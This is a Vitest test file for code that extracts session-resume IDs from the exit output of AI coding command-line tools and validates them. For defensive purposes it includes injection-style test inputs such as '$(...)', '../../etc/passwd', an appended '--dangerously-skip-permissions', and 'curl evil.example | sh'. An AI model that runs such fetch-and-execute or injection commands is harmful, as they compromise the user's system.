import { describe, it, expect } from 'vitest'
import {
  resumeIdFromOutput,
  hasResumeHint,
  resumeTargetFrom,
  isResumeId,
} from '../../src/renderer/src/lib/agentResume'
import { stripAnsi } from '../../src/renderer/src/lib/exportTerminal'
import {
  CLAUDE_EXIT_AFTER_A_TURN,
  CLAUDE_EXIT_NO_TURN,
  AGY_EXIT_AFTER_A_TURN,
  AGY_EXIT_NO_TURN,
  CLAUDE_SESSION_ID,
  AGY_CONVERSATION_ID,
} from '../fixtures/agentExitOutput'

const UUID_A = '0a1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3c4d'
const UUID_B = 'ffffffff-eeee-4ddd-8ccc-bbbbbbbbbbbb'

describe('isResumeId', () => {
  it('accepts a UUID, any case', () => {
    expect(isResumeId(UUID_A)).toBe(true)
    expect(isResumeId(UUID_A.toUpperCase())).toBe(true)
  })

  it.each([
    '', 'abc', UUID_A + 'x', ' ' + UUID_A, UUID_A + '\n', UUID_A + ';', '$(' + UUID_A + ')',
    UUID_A.slice(1), UUID_A.replace(/-/g, ''), UUID_A + ' --dangerously-skip-permissions',
    'my renamed session', '../../etc/passwd', null, undefined, 42, {},
  ])('rejects %j: it is typed onto a command line', (bad) => {
    expect(isResumeId(bad)).toBe(false)
  })
})

describe('resumeIdFromOutput: the real exit output', () => {
  it('reads the session Claude Code names as it exits (escape sequences and all)', () => {
    expect(resumeIdFromOutput('claude', CLAUDE_EXIT_AFTER_A_TURN)).toBe(CLAUDE_SESSION_ID)
    expect(resumeIdFromOutput('claude', stripAnsi(CLAUDE_EXIT_AFTER_A_TURN))).toBe(CLAUDE_SESSION_ID)
  })

  it('reads the conversation the Antigravity CLI names, even with erase-line codes glued to it', () => {
    expect(resumeIdFromOutput('gemini', AGY_EXIT_AFTER_A_TURN)).toBe(AGY_CONVERSATION_ID)
    expect(resumeIdFromOutput('gemini', stripAnsi(AGY_EXIT_AFTER_A_TURN))).toBe(AGY_CONVERSATION_ID)
  })

  it('finds nothing when the agent was quit before anything was said', () => {
    expect(resumeIdFromOutput('claude', CLAUDE_EXIT_NO_TURN)).toBeNull()
    expect(resumeIdFromOutput('gemini', AGY_EXIT_NO_TURN)).toBeNull()
  })

  it("never reads one agent's hint as another's", () => {
    expect(resumeIdFromOutput('gemini', CLAUDE_EXIT_AFTER_A_TURN)).toBeNull()
    expect(resumeIdFromOutput('claude', AGY_EXIT_AFTER_A_TURN)).toBeNull()
    expect(resumeIdFromOutput('codex', CLAUDE_EXIT_AFTER_A_TURN)).toBeNull()
    expect(resumeIdFromOutput('codex', AGY_EXIT_AFTER_A_TURN)).toBeNull()
  })
})

describe('resumeIdFromOutput: shapes', () => {
  it('reads Codex\'s "codex resume <id>" line', () => {
    expect(resumeIdFromOutput('codex', `Token usage: total=1\nTo continue this session, run codex resume ${UUID_A}\n`)).toBe(UUID_A)
  })

  // Not a live capture (Codex's servers are unreachable from where this was written): the wording is the
  // format string compiled into the shipped codex.exe, "To continue this session, run:\r\ncodex resume ",
  // followed by the id.
  it('reads the two-line form Codex prints: "To continue this session, run:" then "codex resume <id>"', () => {
    const out = `\x1b[2mToken usage: total=1\x1b[0m\r\nTo continue this session, run:\r\ncodex resume ${UUID_A}\r\n`
    expect(resumeIdFromOutput('codex', out)).toBe(UUID_A)
    expect(resumeTargetFrom('codex', out, true)).toEqual({ kind: 'id', id: UUID_A })
  })

  it('does not read a NAMED Codex thread as an id, but does not call it silence either', () => {
    const out = 'To continue this session, run:\r\ncodex resume my-feature-thread\r\n'
    expect(resumeIdFromOutput('codex', out)).toBeNull()
    expect(hasResumeHint('codex', out)).toBe(true)
    expect(resumeTargetFrom('codex', out, true)).toEqual({ kind: 'latest' })
  })

  it('takes the LAST hint: a screen redrawn on the way out can repeat older text', () => {
    const out = `claude --resume ${UUID_A}\nsome redraw\nResume this session with:\nclaude --resume ${UUID_B}\n`
    expect(resumeIdFromOutput('claude', out)).toBe(UUID_B)
  })

  it('accepts both spellings of the flag and normalizes case', () => {
    expect(resumeIdFromOutput('gemini', `agy --conversation ${UUID_A.toUpperCase()}`)).toBe(UUID_A)
    expect(resumeIdFromOutput('gemini', `agy --conversation=${UUID_A}`)).toBe(UUID_A)
    expect(resumeIdFromOutput('claude', `claude --resume=${UUID_A}`)).toBe(UUID_A)
  })

  it('reads the .exe spelling', () => {
    expect(resumeIdFromOutput('claude', `claude.exe --resume ${UUID_A}`)).toBe(UUID_A)
  })

  it.each([
    ['a renamed session', 'claude --resume "my feature work"'],
    ['a short id', 'claude --resume abc123'],
    ['an id with a command after it', `claude --resume ${UUID_A}x`],
    ['an id with extra digits', `claude --resume ${UUID_A}0`],
    ['no id at all', 'claude --resume'],
    ['another program', `notclaude --resume ${UUID_A}`],
  ])('does not read %s', (_label, text) => {
    expect(resumeIdFromOutput('claude', text)).toBeNull()
  })

  it('cannot be made to carry anything but the id: a forged line stays inert', () => {
    const forged = `claude --resume ${UUID_A}; curl evil.example | sh`
    // The id itself is clean, and what follows it is never part of the match.
    expect(resumeIdFromOutput('claude', forged)).toBe(UUID_A)
    expect(isResumeId(resumeIdFromOutput('claude', forged))).toBe(true)
    expect(resumeIdFromOutput('claude', 'claude --resume $(curl evil.example)')).toBeNull()
  })
})

describe('hasResumeHint', () => {
  it('sees the real hints and not their absence', () => {
    expect(hasResumeHint('claude', CLAUDE_EXIT_AFTER_A_TURN)).toBe(true)
    expect(hasResumeHint('gemini', AGY_EXIT_AFTER_A_TURN)).toBe(true)
    expect(hasResumeHint('claude', CLAUDE_EXIT_NO_TURN)).toBe(false)
    expect(hasResumeHint('gemini', AGY_EXIT_NO_TURN)).toBe(false)
  })

  it('sees a hint whose id it cannot read (a renamed session): not the same as nothing to resume', () => {
    expect(hasResumeHint('claude', 'Resume this session with:\nclaude --resume "my feature work"\n')).toBe(true)
    expect(hasResumeHint('gemini', 'Resume with -c (or command below):\nagy --conversation=named-thing\n')).toBe(true)
    expect(hasResumeHint('codex', 'To continue this session, run codex resume my-thread\n')).toBe(true)
  })

  // The wording of an exit line is the one thing this depends on that the CLIs can change. A
  // release that rewords it must not turn into "nothing to resume" and a silent new conversation.
  it.each([
    ['a reworded line with a short flag', `To continue, run: claude -r ${UUID_A}`],
    ['a subcommand spelling', `claude resume ${UUID_A}`],
    ['an id in some other sentence', `Session ${UUID_A} saved.`],
    ['words only', 'Your conversation was saved. Pick it back up later.'],
    ['continue only', 'Run claude --continue to carry on'],
  ])('treats %s as a hint it does not understand, never as silence', (_label, text) => {
    expect(hasResumeHint('claude', text)).toBe(true)
    expect(hasResumeHint('gemini', text)).toBe(true)
  })

  it('catches an id whose surrounding words were glued together by stripped cursor movement', () => {
    expect(hasResumeHint('claude', `Resumethissessionwith:claude--resume${UUID_A}`)).toBe(true)
  })

  it('stays quiet for output that says nothing about resuming', () => {
    for (const text of ['', '\n\n', 'press ctrl+c again to exit', '$ ', 'Try "fix typecheck errors"']) {
      expect(hasResumeHint('claude', text), JSON.stringify(text)).toBe(false)
    }
  })
})

describe('resumeTargetFrom', () => {
  it('resumes exactly the session the agent named', () => {
    expect(resumeTargetFrom('claude', CLAUDE_EXIT_AFTER_A_TURN, true)).toEqual({ kind: 'id', id: CLAUDE_SESSION_ID })
    expect(resumeTargetFrom('gemini', AGY_EXIT_AFTER_A_TURN, true)).toEqual({ kind: 'id', id: AGY_CONVERSATION_ID })
    // Even when the quit was not watched (the agent had already exited): an id is an id.
    expect(resumeTargetFrom('claude', CLAUDE_EXIT_AFTER_A_TURN, false)).toEqual({ kind: 'id', id: CLAUDE_SESSION_ID })
  })

  it('starts a new session when a quit it watched named nothing: there is nothing to resume', () => {
    expect(resumeTargetFrom('claude', CLAUDE_EXIT_NO_TURN, true)).toEqual({ kind: 'none', reason: 'empty' })
    expect(resumeTargetFrom('gemini', AGY_EXIT_NO_TURN, true)).toEqual({ kind: 'none', reason: 'empty' })
  })

  it('does NOT call it "nothing to resume" when it did not watch the quit', () => {
    // A missing hint is then just a hint that was printed before the mark.
    expect(resumeTargetFrom('claude', CLAUDE_EXIT_NO_TURN, false)).toEqual({ kind: 'latest' })
    expect(resumeTargetFrom('codex', 'nothing relevant\n', false)).toEqual({ kind: 'latest' })
  })

  it('does NOT call it "nothing to resume" when a hint was there but unreadable', () => {
    for (const text of [
      'Resume this session with:\nclaude --resume "my feature work"\n',
      `To continue, run: claude -r ${UUID_A}`,
      `Session ${UUID_A} saved. Run claude --continue`,
      `claude resume ${UUID_A}`,
      'Resumethissessionwith:claude--resume',
    ]) {
      expect(resumeTargetFrom('claude', text, true), text).toEqual({ kind: 'latest' })
    }
  })

  it("does not trust the absence of a Codex hint: its wording is not confirmed, so the agent's own latest is used", () => {
    expect(resumeTargetFrom('codex', 'nothing relevant\n', true)).toEqual({ kind: 'latest' })
  })

  it('falls back to the latest when the output could not be read, for the agents whose latest is folder-scoped', () => {
    for (const p of ['claude', 'codex'] as const) expect(resumeTargetFrom(p, null, true)).toEqual({ kind: 'latest' })
  })

  // The Antigravity CLI's "latest" is GLOBAL: after a quit with nothing said it resumed a conversation
  // from another project. Guessing wrong there is worse than starting over.
  it('NEVER falls back to the Antigravity CLI\'s global latest: when unsure it starts a new session', () => {
    expect(resumeTargetFrom('gemini', null, true)).toEqual({ kind: 'none', reason: 'unsure' })
    expect(resumeTargetFrom('gemini', AGY_EXIT_NO_TURN, false)).toEqual({ kind: 'none', reason: 'unsure' })
    expect(resumeTargetFrom('gemini', 'Resume with -c (or command below):\nagy --conversation=named-thing\n', true)).toEqual({ kind: 'none', reason: 'unsure' })
    expect(resumeTargetFrom('gemini', `Session ${UUID_A} saved.`, true)).toEqual({ kind: 'none', reason: 'unsure' })
  })

  it('still prefers an id it can read, in every state', () => {
    for (const watched of [true, false]) {
      expect(resumeTargetFrom('gemini', AGY_EXIT_AFTER_A_TURN, watched)).toEqual({ kind: 'id', id: AGY_CONVERSATION_ID })
    }
  })
})
